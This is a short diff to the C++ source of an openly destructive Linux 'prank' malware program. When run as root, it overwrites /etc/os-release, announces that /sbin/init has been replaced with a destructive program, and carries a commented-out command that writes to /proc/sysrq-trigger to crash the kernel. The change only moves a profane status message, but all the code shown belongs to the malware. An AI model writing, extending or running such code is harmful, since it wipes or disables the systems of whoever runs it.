@@ -16,8 +16,6 @@ int main()
       return EXIT_FAILURE;
     } else if (uid == 0) {
 
-    std::cout << "You ran this as Root, eh? If you did, Hatsune Miku turned evil and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
-
     std::cout << "Are you absolutely sure you would like to continue??\nThere is no going back after running this fully.\n(y/N) >>> ";
 
     std::string answer;
@@ -40,6 +38,8 @@ int main()
 
     OsRelease << "NAME=Hatsune Miku Linux\nPRETTY_NAME=Hatsune Miku Linux\nID=miku\n";
     OsRelease.close();
+
+    std::cout << "Hatsune Miku and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
 
     // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
     // system("echo c > /proc/sysrq-trigger");
